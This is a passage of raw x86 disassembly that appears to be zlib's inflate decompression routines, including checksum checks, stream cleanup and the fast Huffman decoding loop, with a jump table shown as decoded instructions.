   1ca7a:	mov    DWORD PTR [ebp-0x1c],eax
   1ca7d:	test   eax,eax
   1ca7f:	je     0x1caa9
   1ca81:	push   eax
   1ca82:	mov    eax,DWORD PTR [ebp-0x18]
   1ca85:	sub    eax,DWORD PTR [ebp-0x1c]
   1ca88:	cmp    DWORD PTR [esi+0x10],0x0
   1ca8c:	push   eax
   1ca8d:	push   DWORD PTR [esi+0x18]
   1ca90:	je     0x1ca99
   1ca92:	call   0x1d9ea
   1ca97:	jmp    0x1ca9e
   1ca99:	call   0x1d548
   1ca9e:	mov    ecx,DWORD PTR [ebp+0x8]
   1caa1:	mov    DWORD PTR [esi+0x18],eax
   1caa4:	mov    DWORD PTR [ecx+0x30],eax
   1caa7:	mov    edx,ecx
   1caa9:	cmp    DWORD PTR [esi+0x10],0x0
   1caad:	mov    eax,DWORD PTR [ebp-0x14]
   1cab0:	mov    DWORD PTR [ebp-0x1c],eax
   1cab3:	mov    eax,ebx
   1cab5:	jne    0x1cada
   1cab7:	and    eax,0xff00
   1cabc:	mov    ecx,ebx
   1cabe:	shl    ecx,0x10
   1cac1:	add    eax,ecx
   1cac3:	mov    ecx,ebx
   1cac5:	shr    ecx,0x8
   1cac8:	and    ecx,0xff00
   1cace:	shl    eax,0x8
   1cad1:	add    eax,ecx
   1cad3:	mov    ecx,ebx
   1cad5:	shr    ecx,0x18
   1cad8:	add    eax,ecx
   1cada:	cmp    eax,DWORD PTR [esi+0x18]
   1cadd:	je     0x1cae8
   1cadf:	mov    DWORD PTR [edx+0x18],0x1ec68
   1cae6:	jmp    0x1cb32
   1cae8:	xor    ebx,ebx
   1caea:	xor    edi,edi
   1caec:	mov    DWORD PTR [esi],0x19
   1caf2:	cmp    DWORD PTR [esi+0x8],0x0
   1caf6:	je     0x1cb70
   1caf8:	cmp    DWORD PTR [esi+0x10],0x0
   1cafc:	je     0x1cb70
   1cafe:	cmp    edi,0x20
   1cb01:	jae    0x1cb26
   1cb03:	cmp    DWORD PTR [ebp-0x8],0x0
   1cb07:	je     0x1cb86
   1cb09:	mov    eax,DWORD PTR [ebp-0x4]
   1cb0c:	movzx  eax,BYTE PTR [eax]
   1cb0f:	dec    DWORD PTR [ebp-0x8]
   1cb12:	mov    ecx,edi
   1cb14:	shl    eax,cl
   1cb16:	add    edi,0x8
   1cb19:	add    ebx,eax
   1cb1b:	inc    DWORD PTR [ebp-0x4]
   1cb1e:	cmp    edi,0x20
   1cb21:	jb     0x1cb03
   1cb23:	mov    edx,DWORD PTR [ebp+0x8]
   1cb26:	cmp    ebx,DWORD PTR [esi+0x1c]
   1cb29:	je     0x1cb6c
   1cb2b:	mov    DWORD PTR [edx+0x18],0x1ec50
   1cb32:	mov    DWORD PTR [esi],0x1b
   1cb38:	mov    eax,DWORD PTR [esi]
   1cb3a:	cmp    eax,0x1c
   1cb3d:	jbe    0x1bb28
   1cb43:	jmp    0x1bb1e
   1cb48:	mov    eax,DWORD PTR [ebp-0x18]
   1cb4b:	mov    DWORD PTR [edx+0xc],eax
   1cb4e:	mov    eax,DWORD PTR [ebp-0x14]
   1cb51:	mov    DWORD PTR [edx+0x10],eax
   1cb54:	mov    eax,DWORD PTR [ebp-0x4]
   1cb57:	mov    DWORD PTR [edx],eax
   1cb59:	mov    eax,DWORD PTR [ebp-0x8]
   1cb5c:	mov    DWORD PTR [edx+0x4],eax
   1cb5f:	mov    DWORD PTR [esi+0x38],ebx
   1cb62:	mov    DWORD PTR [esi+0x3c],edi
   1cb65:	push   0x2
   1cb67:	jmp    0x1bb20
   1cb6c:	xor    ebx,ebx
   1cb6e:	xor    edi,edi
   1cb70:	mov    DWORD PTR [esi],0x1a
   1cb76:	mov    DWORD PTR [ebp-0x24],0x1
   1cb7d:	jmp    0x1cb86
   1cb7f:	mov    DWORD PTR [ebp-0x24],0xfffffffd
   1cb86:	mov    eax,DWORD PTR [ebp+0x8]
   1cb89:	mov    ecx,DWORD PTR [ebp-0x18]
   1cb8c:	mov    DWORD PTR [eax+0xc],ecx
   1cb8f:	mov    ecx,DWORD PTR [ebp-0x14]
   1cb92:	mov    DWORD PTR [eax+0x10],ecx
   1cb95:	mov    ecx,DWORD PTR [ebp-0x4]
   1cb98:	mov    DWORD PTR [eax],ecx
   1cb9a:	mov    ecx,DWORD PTR [ebp-0x8]
   1cb9d:	mov    DWORD PTR [eax+0x4],ecx
   1cba0:	cmp    DWORD PTR [esi+0x28],0x0
   1cba4:	mov    DWORD PTR [esi+0x38],ebx
   1cba7:	mov    DWORD PTR [esi+0x3c],edi
   1cbaa:	jne    0x1cbbc
   1cbac:	cmp    DWORD PTR [esi],0x18
   1cbaf:	jge    0x1cbd8
   1cbb1:	mov    eax,DWORD PTR [ebp-0x1c]
   1cbb4:	mov    ecx,DWORD PTR [ebp+0x8]
   1cbb7:	cmp    eax,DWORD PTR [ecx+0x10]
   1cbba:	je     0x1cbd8
   1cbbc:	mov    eax,DWORD PTR [ebp-0x1c]
   1cbbf:	mov    edi,DWORD PTR [ebp+0x8]
   1cbc2:	call   0x1b9e0
   1cbc7:	test   eax,eax
   1cbc9:	je     0x1cbd8
   1cbcb:	mov    DWORD PTR [esi],0x1c
   1cbd1:	push   0xfffffffc
   1cbd3:	jmp    0x1bb20
   1cbd8:	mov    edi,DWORD PTR [ebp+0x8]
   1cbdb:	mov    eax,DWORD PTR [ebp-0x2c]
   1cbde:	sub    eax,DWORD PTR [edi+0x4]
   1cbe1:	mov    ebx,DWORD PTR [ebp-0x1c]
   1cbe4:	sub    ebx,DWORD PTR [edi+0x10]
   1cbe7:	add    DWORD PTR [edi+0x8],eax
   1cbea:	add    DWORD PTR [edi+0x14],ebx
   1cbed:	add    DWORD PTR [esi+0x1c],ebx
   1cbf0:	cmp    DWORD PTR [esi+0x8],0x0
   1cbf4:	mov    DWORD PTR [ebp-0x2c],eax
   1cbf7:	je     0x1cc22
   1cbf9:	test   ebx,ebx
   1cbfb:	je     0x1cc22
   1cbfd:	mov    eax,DWORD PTR [edi+0xc]
   1cc00:	push   ebx
   1cc01:	sub    eax,ebx
   1cc03:	cmp    DWORD PTR [esi+0x10],0x0
   1cc07:	push   eax
   1cc08:	push   DWORD PTR [esi+0x18]
   1cc0b:	je     0x1cc14
   1cc0d:	call   0x1d9ea
   1cc12:	jmp    0x1cc19
   1cc14:	call   0x1d548
   1cc19:	mov    DWORD PTR [esi+0x18],eax
   1cc1c:	mov    DWORD PTR [edi+0x30],eax
   1cc1f:	mov    eax,DWORD PTR [ebp-0x2c]
   1cc22:	cmp    DWORD PTR [esi],0xb
   1cc25:	jne    0x1cc2e
   1cc27:	mov    ecx,0x80
   1cc2c:	jmp    0x1cc30
   1cc2e:	xor    ecx,ecx
   1cc30:	mov    edx,DWORD PTR [esi+0x4]
   1cc33:	neg    edx
   1cc35:	sbb    edx,edx
   1cc37:	and    edx,0x40
   1cc3a:	add    edx,ecx
   1cc3c:	add    edx,DWORD PTR [esi+0x3c]
   1cc3f:	mov    DWORD PTR [edi+0x2c],edx
   1cc42:	test   eax,eax
   1cc44:	jne    0x1cc4a
   1cc46:	test   ebx,ebx
   1cc48:	je     0x1cc50
   1cc4a:	cmp    DWORD PTR [ebp+0xc],0x4
   1cc4e:	jne    0x1cc5d
   1cc50:	cmp    DWORD PTR [ebp-0x24],0x0
   1cc54:	jne    0x1cc5d
   1cc56:	mov    DWORD PTR [ebp-0x24],0xfffffffb
   1cc5d:	mov    eax,DWORD PTR [ebp-0x24]
   1cc60:	jmp    0x1bb21
   1cc65:	lea    ecx,[ecx+0x0]
   1cc68:	xor    bh,BYTE PTR [ebx-0x43a9ffff]
   1cc6e:	add    DWORD PTR [eax],eax
   1cc70:	jmp    0x1cc2e
   1cc72:	add    DWORD PTR [eax],eax
   1cc74:	popa   
   1cc75:	mov    ebp,0xbdda0001
   1cc7a:	add    DWORD PTR [eax],eax
   1cc7c:	pop    ecx
   1cc7d:	mov    esi,0xbef40001
   1cc82:	add    DWORD PTR [eax],eax
   1cc84:	lea    edi,[edi-0x3fddffff]
   1cc8a:	add    DWORD PTR [eax],eax
   1cc8c:	mov    ds:0x1c0,al
   1cc91:	rol    DWORD PTR [ecx],0x0
   1cc94:	and    eax,ecx
   1cc96:	add    DWORD PTR [eax],eax
   1cc98:	xor    cl,al
   1cc9a:	add    DWORD PTR [eax],eax
   1cc9c:	ffreep st(1)
   1cc9e:	add    DWORD PTR [eax],eax
   1cca0:	aas    
   1cca1:	ret    0x1
   1cca4:	xchg   ebp,eax
   1cca5:	ret    0x1
   1cca8:	push   edi
   1cca9:	ret    
   1ccaa:	add    DWORD PTR [eax],eax
   1ccac:	(bad)
   1ccaf:	add    BYTE PTR ds:0xc80001c6,ch
   1ccb5:	mov    DWORD PTR [ecx],0x1c80e00
   1ccbb:	add    BYTE PTR [ecx],ch
   1ccbd:	leave  
   1ccbe:	add    DWORD PTR [eax],eax
   1ccc0:	(bad)  
   1ccc1:	leave  
   1ccc2:	add    DWORD PTR [eax],eax
   1ccc4:	adc    eax,0x380001ca
   1ccc9:	retf   0x1
   1cccc:	repnz retf 0x1
   1ccd0:	jbe    0x1cc9d
   1ccd2:	add    DWORD PTR [eax],eax
   1ccd4:	jg     0x1cca1
   1ccd6:	add    DWORD PTR [eax],eax
   1ccd8:	ror    ebx,1
   1ccda:	add    DWORD PTR [eax],eax
   1ccdc:	int3   
   1ccdd:	int3   
   1ccde:	int3   
   1ccdf:	int3   
   1cce0:	int3   
   1cce1:	int3   
   1cce2:	mov    edi,edi
   1cce4:	push   ebp
   1cce5:	mov    ebp,esp
   1cce7:	push   esi
   1cce8:	mov    esi,DWORD PTR [ebp+0x8]
   1cceb:	test   esi,esi
   1cced:	je     0x1cd1b
   1ccef:	mov    eax,DWORD PTR [esi+0x1c]
   1ccf2:	test   eax,eax
   1ccf4:	je     0x1cd1b
   1ccf6:	mov    ecx,DWORD PTR [esi+0x24]
   1ccf9:	test   ecx,ecx
   1ccfb:	je     0x1cd1b
   1ccfd:	mov    eax,DWORD PTR [eax+0x34]
   1cd00:	test   eax,eax
   1cd02:	je     0x1cd0a
   1cd04:	push   eax
   1cd05:	push   DWORD PTR [esi+0x28]
   1cd08:	call   ecx
   1cd0a:	push   DWORD PTR [esi+0x1c]
   1cd0d:	push   DWORD PTR [esi+0x28]
   1cd10:	call   DWORD PTR [esi+0x24]
   1cd13:	and    DWORD PTR [esi+0x1c],0x0
   1cd17:	xor    eax,eax
   1cd19:	jmp    0x1cd1e
   1cd1b:	push   0xfffffffe
   1cd1d:	pop    eax
   1cd1e:	pop    esi
   1cd1f:	pop    ebp
   1cd20:	ret    0x4
   1cd23:	int3   
   1cd24:	int3   
   1cd25:	int3   
   1cd26:	int3   
   1cd27:	int3   
   1cd28:	mov    edi,edi
   1cd2a:	push   ebp
   1cd2b:	mov    ebp,esp
   1cd2d:	mov    eax,DWORD PTR [ebp+0xc]
   1cd30:	imul   eax,DWORD PTR [ebp+0x10]
   1cd34:	push   eax
   1cd35:	call   0x1da0e
   1cd3a:	pop    ecx
   1cd3b:	pop    ebp
   1cd3c:	ret    0xc
   1cd3f:	int3   
   1cd40:	int3   
   1cd41:	int3   
   1cd42:	int3   
   1cd43:	int3   
   1cd44:	mov    edi,edi
   1cd46:	push   ebp
   1cd47:	mov    ebp,esp
   1cd49:	push   DWORD PTR [ebp+0xc]
   1cd4c:	call   0x10a9a
   1cd51:	pop    ecx
   1cd52:	pop    ebp
   1cd53:	ret    0x8
   1cd56:	int3   
   1cd57:	int3   
   1cd58:	int3   
   1cd59:	int3   
   1cd5a:	int3   
   1cd5b:	int3   
   1cd5c:	mov    edi,edi
   1cd5e:	push   ebp
   1cd5f:	mov    ebp,esp
   1cd61:	sub    esp,0x40
   1cd64:	mov    eax,DWORD PTR [ebp+0x8]
   1cd67:	mov    ecx,DWORD PTR [eax+0x4]
   1cd6a:	mov    edx,DWORD PTR [eax+0x10]
   1cd6d:	push   ebx
   1cd6e:	mov    ebx,DWORD PTR [eax]
   1cd70:	dec    ebx
   1cd71:	lea    ecx,[ecx+ebx*1-0x5]
   1cd75:	mov    DWORD PTR [ebp-0x2c],ecx
   1cd78:	mov    ecx,edx
   1cd7a:	sub    ecx,DWORD PTR [ebp+0xc]
   1cd7d:	push   esi
   1cd7e:	mov    esi,DWORD PTR [eax+0x1c]
   1cd81:	push   edi
   1cd82:	mov    edi,DWORD PTR [eax+0xc]
   1cd85:	dec    edi
   1cd86:	add    ecx,edi
   1cd88:	mov    DWORD PTR [ebp-0x3c],ecx
   1cd8b:	lea    ecx,[edx+edi*1-0x101]
   1cd92:	mov    DWORD PTR [ebp-0x30],ecx
   1cd95:	mov    ecx,DWORD PTR [esi+0x28]
   1cd98:	mov    DWORD PTR [ebp-0x24],ecx
   1cd9b:	mov    ecx,DWORD PTR [esi+0x2c]
   1cd9e:	mov    DWORD PTR [ebp-0x40],ecx
   1cda1:	mov    ecx,DWORD PTR [esi+0x30]
   1cda4:	mov    DWORD PTR [ebp-0x18],ecx
   1cda7:	mov    ecx,DWORD PTR [esi+0x34]
   1cdaa:	mov    DWORD PTR [ebp-0x28],ecx
   1cdad:	mov    ecx,DWORD PTR [esi+0x38]
   1cdb0:	mov    DWORD PTR [ebp-0x4],ecx
   1cdb3:	mov    ecx,DWORD PTR [esi+0x3c]
   1cdb6:	mov    DWORD PTR [ebp+0xc],ecx
   1cdb9:	mov    ecx,DWORD PTR [esi+0x4c]
   1cdbc:	xor    edx,edx
   1cdbe:	mov    DWORD PTR [ebp-0x1c],ecx
   1cdc1:	mov    ecx,DWORD PTR [esi+0x50]
   1cdc4:	inc    edx
   1cdc5:	mov    DWORD PTR [ebp-0x20],ecx
   1cdc8:	mov    ecx,DWORD PTR [esi+0x54]
   1cdcb:	shl    edx,cl
   1cdcd:	mov    ecx,DWORD PTR [esi+0x58]
   1cdd0:	dec    edx
   1cdd1:	mov    DWORD PTR [ebp-0x34],edx
   1cdd4:	xor    edx,edx
   1cdd6:	inc    edx
   1cdd7:	shl    edx,cl
   1cdd9:	dec    edx
   1cdda:	mov    DWORD PTR [ebp-0x38],edx
   1cddd:	mov    ecx,DWORD PTR [ebp+0xc]
   1cde0:	cmp    ecx,0xf
   1cde3:	jae    0x1ce02
   1cde5:	add    DWORD PTR [ebp+0xc],0x8
   1cde9:	inc    ebx
   1cdea:	movzx  edx,BYTE PTR [ebx]
   1cded:	shl    edx,cl
   1cdef:	mov    ecx,DWORD PTR [ebp+0xc]
   1cdf2:	add    DWORD PTR [ebp-0x4],edx
   1cdf5:	inc    ebx
   1cdf6:	movzx  edx,BYTE PTR [ebx]
   1cdf9:	shl    edx,cl
   1cdfb:	add    DWORD PTR [ebp-0x4],edx
   1cdfe:	add    DWORD PTR [ebp+0xc],0x8
   1ce02:	mov    ecx,DWORD PTR [ebp-0x34]
   1ce05:	and    ecx,DWORD PTR [ebp-0x4]
   1ce08:	mov    edx,DWORD PTR [ebp-0x1c]
   1ce0b:	mov    ecx,DWORD PTR [edx+ecx*4]
   1ce0e:	mov    DWORD PTR [ebp-0x10],ecx
   1ce11:	mov    edx,DWORD PTR [ebp-0x10]
   1ce14:	shr    ecx,0x8
   1ce17:	movzx  ecx,cl
   1ce1a:	shr    DWORD PTR [ebp-0x4],cl
   1ce1d:	sub    DWORD PTR [ebp+0xc],ecx
   1ce20:	mov    DWORD PTR [ebp-0x8],ecx
   1ce23:	movzx  ecx,dl
   1ce26:	mov    DWORD PTR [ebp-0x8],ecx
   1ce29:	test   ecx,ecx
   1ce2b:	je     0x1ce74
   1ce2d:	mov    ecx,DWORD PTR [ebp-0x8]
   1ce30:	test   cl,0x10
   1ce33:	jne    0x1ce7f
   1ce35:	test   cl,0x40
   1ce38:	jne    0x1d0ce
   1ce3e:	xor    edx,edx
   1ce40:	inc    edx
   1ce41:	shl    edx,cl
   1ce43:	mov    ecx,DWORD PTR [ebp-0x10]
   1ce46:	shr    ecx,0x10
   1ce49:	dec    edx
   1ce4a:	and    edx,DWORD PTR [ebp-0x4]
   1ce4d:	add    edx,ecx
   1ce4f:	mov    ecx,DWORD PTR [ebp-0x1c]
   1ce52:	mov    ecx,DWORD PTR [ecx+edx*4]
   1ce55:	mov    DWORD PTR [ebp-0x10],ecx
   1ce58:	mov    edx,DWORD PTR [ebp-0x10]
   1ce5b:	shr    ecx,0x8
   1ce5e:	movzx  ecx,cl
   1ce61:	shr    DWORD PTR [ebp-0x4],cl
   1ce64:	sub    DWORD PTR [ebp+0xc],ecx
   1ce67:	mov    DWORD PTR [ebp-0x8],ecx
   1ce6a:	movzx  ecx,dl
   1ce6d:	mov    DWORD PTR [ebp-0x8],ecx
   1ce70:	test   ecx,ecx
   1ce72:	jne    0x1ce2d
   1ce74:	inc    edi
   1ce75:	shr    edx,0x10
   1ce78:	mov    BYTE PTR [edi],dl
   1ce7a:	jmp    0x1d0ac
   1ce7f:	shr    edx,0x10
   1ce82:	and    ecx,0xf
   1ce85:	mov    DWORD PTR [ebp-0xc],edx
   1ce88:	mov    DWORD PTR [ebp-0x8],ecx
   1ce8b:	je     0x1ceb7
   1ce8d:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce90:	cmp    ecx,DWORD PTR [ebp-0x8]
   1ce93:	jae    0x1cea2
   1ce95:	inc    ebx
   1ce96:	movzx  edx,BYTE PTR [ebx]
   1ce99:	shl    edx,cl
   1ce9b:	add    DWORD PTR [ebp-0x4],edx
   1ce9e:	add    DWORD PTR [ebp+0xc],0x8
   1cea2:	mov    ecx,DWORD PTR [ebp-0x8]
   1cea5:	xor    edx,edx
   1cea7:	inc    edx
   1cea8:	shl    edx,cl
   1ceaa:	dec    edx
   1ceab:	and    edx,DWORD PTR [ebp-0x4]
   1ceae:	shr    DWORD PTR [ebp-0x4],cl
   1ceb1:	add    DWORD PTR [ebp-0xc],edx
   1ceb4:	sub    DWORD PTR [ebp+0xc],ecx
   1ceb7:	mov    ecx,DWORD PTR [ebp+0xc]
   1ceba:	cmp    ecx,0xf
   1cebd:	jae    0x1cedc
   1cebf:	add    DWORD PTR [ebp+0xc],0x8
   1cec3:	inc    ebx
   1cec4:	movzx  edx,BYTE PTR [ebx]
   1cec7:	shl    edx,cl
   1cec9:	mov    ecx,DWORD PTR [ebp+0xc]
   1cecc:	add    DWORD PTR [ebp-0x4],edx
   1cecf:	inc    ebx
   1ced0:	movzx  edx,BYTE PTR [ebx]
   1ced3:	shl    edx,cl
   1ced5:	add    DWORD PTR [ebp-0x4],edx
   1ced8:	add    DWORD PTR [ebp+0xc],0x8
   1cedc:	mov    ecx,DWORD PTR [ebp-0x38]
   1cedf:	and    ecx,DWORD PTR [ebp-0x4]
   1cee2:	mov    edx,DWORD PTR [ebp-0x20]
   1cee5:	mov    ecx,DWORD PTR [edx+ecx*4]
   1cee8:	jmp    0x1cf08
   1ceea:	test   cl,0x40
   1ceed:	jne    0x1d0c5
   1cef3:	xor    edx,edx
   1cef5:	inc    edx
   1cef6:	shl    edx,cl
   1cef8:	movzx  ecx,WORD PTR [ebp-0xe]
   1cefc:	dec    edx
   1cefd:	and    edx,DWORD PTR [ebp-0x4]
   1cf00:	add    edx,ecx
   1cf02:	mov    ecx,DWORD PTR [ebp-0x20]
   1cf05:	mov    ecx,DWORD PTR [ecx+edx*4]
   1cf08:	mov    DWORD PTR [ebp-0x10],ecx
   1cf0b:	mov    edx,DWORD PTR [ebp-0x10]
   1cf0e:	shr    ecx,0x8
   1cf11:	movzx  ecx,cl
   1cf14:	shr    DWORD PTR [ebp-0x4],cl
   1cf17:	sub    DWORD PTR [ebp+0xc],ecx
   1cf1a:	mov    DWORD PTR [ebp-0x8],ecx
   1cf1d:	movzx  ecx,dl
   1cf20:	test   cl,0x10
   1cf23:	je     0x1ceea
   1cf25:	and    ecx,0xf
   1cf28:	shr    edx,0x10
   1cf2b:	mov    DWORD PTR [ebp-0x14],edx
   1cf2e:	mov    DWORD PTR [ebp-0x8],ecx
   1cf31:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf34:	jae    0x1cf61
   1cf36:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf39:	add    DWORD PTR [ebp+0xc],0x8
   1cf3d:	inc    ebx
   1cf3e:	movzx  edx,BYTE PTR [ebx]
   1cf41:	shl    edx,cl
   1cf43:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf46:	add    DWORD PTR [ebp-0x4],edx
   1cf49:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf4c:	jae    0x1cf61
   1cf4e:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf51:	inc    ebx
   1cf52:	movzx  edx,BYTE PTR [ebx]
   1cf55:	shl    edx,cl
   1cf57:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf5a:	add    DWORD PTR [ebp-0x4],edx
   1cf5d:	add    DWORD PTR [ebp+0xc],0x8
   1cf61:	xor    edx,edx
   1cf63:	inc    edx
   1cf64:	shl    edx,cl
   1cf66:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf69:	sub    DWORD PTR [ebp+0xc],ecx
   1cf6c:	dec    edx
   1cf6d:	and    edx,DWORD PTR [ebp-0x4]
   1cf70:	shr    DWORD PTR [ebp-0x4],cl
   1cf73:	add    DWORD PTR [ebp-0x14],edx
   1cf76:	mov    edx,DWORD PTR [ebp-0x14]
   1cf79:	mov    ecx,edi
   1cf7b:	sub    ecx,DWORD PTR [ebp-0x3c]
   1cf7e:	cmp    edx,ecx
   1cf80:	jbe    0x1d074
   1cf86:	sub    edx,ecx
   1cf88:	mov    DWORD PTR [ebp-0x8],edx
   1cf8b:	cmp    edx,DWORD PTR [ebp-0x40]
   1cf8e:	ja     0x1d0bc
   1cf94:	mov    ecx,DWORD PTR [ebp-0x28]
   1cf97:	dec    ecx
   1cf98:	mov    DWORD PTR [ebp-0x10],ecx
   1cf9b:	mov    ecx,DWORD PTR [ebp-0x18]
   1cf9e:	test   ecx,ecx
   1cfa0:	jne    0x1cfc8
   1cfa2:	mov    ecx,DWORD PTR [ebp-0x24]
   1cfa5:	sub    ecx,edx
   1cfa7:	add    DWORD PTR [ebp-0x10],ecx
   1cfaa:	mov    ecx,edx
   1cfac:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cfaf:	jae    0x1d03d
   1cfb5:	sub    DWORD PTR [ebp-0xc],ecx
   1cfb8:	mov    ecx,DWORD PTR [ebp-0x10]
   1cfbb:	inc    ecx
   1cfbc:	mov    dl,BYTE PTR [ecx]
   1cfbe:	inc    edi
   1cfbf:	dec    DWORD PTR [ebp-0x8]
   1cfc2:	mov    BYTE PTR [edi],dl
   1cfc4:	jne    0x1cfbb
   1cfc6:	jmp    0x1d013
   1cfc8:	cmp    ecx,edx
   1cfca:	jae    0x1d01d
   1cfcc:	sub    ecx,edx
   1cfce:	add    ecx,DWORD PTR [ebp-0x24]
   1cfd1:	add    DWORD PTR [ebp-0x10],ecx
   1cfd4:	mov    ecx,DWORD PTR [ebp-0x8]
   1cfd7:	sub    ecx,DWORD PTR [ebp-0x18]
   1cfda:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cfdd:	jae    0x1d03d
   1cfdf:	sub    DWORD PTR [ebp-0xc],ecx
   1cfe2:	inc    DWORD PTR [ebp-0x10]
   1cfe5:	mov    edx,DWORD PTR [ebp-0x10]
   1cfe8:	mov    dl,BYTE PTR [edx]
   1cfea:	inc    edi
   1cfeb:	dec    ecx
   1cfec:	mov    BYTE PTR [edi],dl
   1cfee:	jne    0x1cfe2
   1cff0:	mov    ecx,DWORD PTR [ebp-0x28]
   1cff3:	dec    ecx
   1cff4:	mov    DWORD PTR [ebp-0x10],ecx
   1cff7:	mov    ecx,DWORD PTR [ebp-0x18]
   1cffa:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cffd:	jae    0x1d03d
   1cfff:	sub    DWORD PTR [ebp-0xc],ecx
   1d002:	mov    DWORD PTR [ebp-0x8],ecx
   1d005:	mov    ecx,DWORD PTR [ebp-0x10]
   1d008:	inc    ecx
   1d009:	mov    dl,BYTE PTR [ecx]
   1d00b:	inc    edi
   1d00c:	dec    DWORD PTR [ebp-0x8]
   1d00f:	mov    BYTE PTR [edi],dl
   1d011:	jne    0x1d008
   1d013:	mov    ecx,edi
   1d015:	sub    ecx,DWORD PTR [ebp-0x14]
   1d018:	mov    DWORD PTR [ebp-0x10],ecx
   1d01b:	jmp    0x1d040
   1d01d:	sub    ecx,edx
   1d01f:	add    DWORD PTR [ebp-0x10],ecx
   1d022:	mov    ecx,DWORD PTR [ebp-0x8]
   1d025:	cmp    ecx,DWORD PTR [ebp-0xc]
   1d028:	jae    0x1d03d
   1d02a:	sub    DWORD PTR [ebp-0xc],ecx
   1d02d:	mov    ecx,DWORD PTR [ebp-0x10]
   1d030:	inc    ecx
   1d031:	mov    dl,BYTE PTR [ecx]
   1d033:	inc    edi
   1d034:	dec    DWORD PTR [ebp-0x8]
   1d037:	mov    BYTE PTR [edi],dl
   1d039:	jne    0x1d030
   1d03b:	jmp    0x1d013
   1d03d:	mov    ecx,DWORD PTR [ebp-0x10]
   1d040:	mov    edx,DWORD PTR [ebp-0xc]
   1d043:	cmp    edx,0x2
   1d046:	jbe    0x1d094
   1d048:	lea    eax,[edx-0x3]
   1d04b:	push   0x3
   1d04d:	xor    edx,edx
   1d04f:	pop    ecx
   1d050:	div    ecx
   1d052:	mov    ecx,DWORD PTR [ebp-0x10]
   1d055:	inc    eax
   1d056:	sub    DWORD PTR [ebp-0xc],0x3
   1d05a:	inc    ecx
   1d05b:	mov    dl,BYTE PTR [ecx]
   1d05d:	inc    edi
   1d05e:	mov    BYTE PTR [edi],dl
   1d060:	inc    ecx
   1d061:	mov    dl,BYTE PTR [ecx]
   1d063:	inc    edi
   1d064:	inc    ecx
   1d065:	mov    BYTE PTR [edi],dl
   1d067:	mov    dl,BYTE PTR [ecx]
   1d069:	inc    edi
   1d06a:	dec    eax
   1d06b:	mov    BYTE PTR [edi],dl
   1d06d:	jne    0x1d056
   1d06f:	mov    eax,DWORD PTR [ebp+0x8]
   1d072:	jmp    0x1d094
   1d074:	mov    ecx,edi
   1d076:	sub    ecx,edx
   1d078:	sub    DWORD PTR [ebp-0xc],0x3
   1d07c:	inc    ecx
   1d07d:	mov    dl,BYTE PTR [ecx]
   1d07f:	inc    edi
   1d080:	mov    BYTE PTR [edi],dl
   1d082:	inc    ecx
   1d083:	mov    dl,BYTE PTR [ecx]
   1d085:	inc    edi
   1d086:	inc    ecx
   1d087:	mov    BYTE PTR [edi],dl
   1d089:	mov    dl,BYTE PTR [ecx]
   1d08b:	inc    edi
   1d08c:	cmp    DWORD PTR [ebp-0xc],0x2
   1d090:	mov    BYTE PTR [edi],dl
   1d092:	ja     0x1d078
   1d094:	cmp    DWORD PTR [ebp-0xc],0x0
   1d098:	je     0x1d0ac
   1d09a:	inc    ecx
   1d09b:	mov    dl,BYTE PTR [ecx]
   1d09d:	inc    edi
   1d09e:	cmp    DWORD PTR [ebp-0xc],0x1
   1d0a2:	mov    BYTE PTR [edi],dl
   1d0a4:	jbe    0x1d0ac
   1d0a6:	mov    cl,BYTE PTR [ecx+0x1]
   1d0a9:	inc    edi
   1d0aa:	mov    BYTE PTR [edi],cl
   1d0ac:	cmp    ebx,DWORD PTR [ebp-0x2c]
   1d0af:	jae    0x1d0e8
   1d0b1:	cmp    edi,DWORD PTR [ebp-0x30]
   1d0b4:	jb     0x1cddd
   1d0ba:	jmp    0x1d0e8
   1d0bc:	mov    DWORD PTR [eax+0x18],0x1ec7e
   1d0c3:	jmp    0x1d0e2
   1d0c5:	mov    DWORD PTR [eax+0x18],0x1ec9c
   1d0cc:	jmp    0x1d0e2
   1d0ce:	test   cl,0x20
   1d0d1:	je     0x1d0db
   1d0d3:	mov    DWORD PTR [esi],0xb
   1d0d9:	jmp    0x1d0e8
   1d0db:	mov    DWORD PTR [eax+0x18],0x1ecb2
   1d0e2:	mov    DWORD PTR [esi],0x1b
   1d0e8:	mov    ecx,DWORD PTR [ebp+0xc]
   1d0eb:	shr    ecx,0x3
   1d0ee:	sub    ebx,ecx
   1d0f0:	shl    ecx,0x3
   1d0f3:	sub    DWORD PTR [ebp+0xc],ecx
   1d0f6:	xor    ecx,ecx
   1d0f8:	inc    ecx
   1d0f9:	mov    edx,ecx
   1d0fb:	mov    ecx,DWORD PTR [ebp+0xc]
   1d0fe:	shl    edx,cl
   1d100:	dec    edx
   1d101:	mov    ecx,edx
   1d103:	mov    edx,DWORD PTR [ebp-0x4]
   1d106:	and    edx,ecx
   1d108:	lea    ecx,[ebx+0x1]
   1d10b:	mov    DWORD PTR [eax],ecx
   1d10d:	lea    ecx,[edi+0x1]
   1d110:	mov    DWORD PTR [eax+0xc],ecx
   1d113:	mov    ecx,DWORD PTR [ebp-0x2c]
   1d116:	sub    ecx,ebx
   1d118:	add    ecx,0x5
   1d11b:	mov    DWORD PTR [eax+0x4],ecx
   1d11e:	mov    ecx,DWORD PTR [ebp-0x30]
   1d121:	sub    ecx,edi
   1d123:	add    ecx,0x101
   1d129:	mov    DWORD PTR [eax+0x10],ecx
   1d12c:	mov    eax,DWORD PTR [ebp+0xc]
   1d12f:	pop    edi
   1d130:	mov    DWORD PTR [esi+0x38],edx
   1d133:	mov    DWORD PTR [esi+0x3c],eax
   1d136:	pop    esi
   1d137:	pop    ebx
   1d138:	leave  
   1d139:	ret    0x8
   1d13c:	int3   
   1d13d:	int3   
   1d13e:	int3   
   1d13f:	int3   
   1d140:	int3   
   1d141:	int3   
   1d142:	mov    edi,edi
   1d144:	push   ebp
   1d145:	mov    ebp,esp
   1d147:	sub    esp,0x90
   1d14d:	mov    eax,ds:0x7eb38
   1d152:	xor    eax,ebp
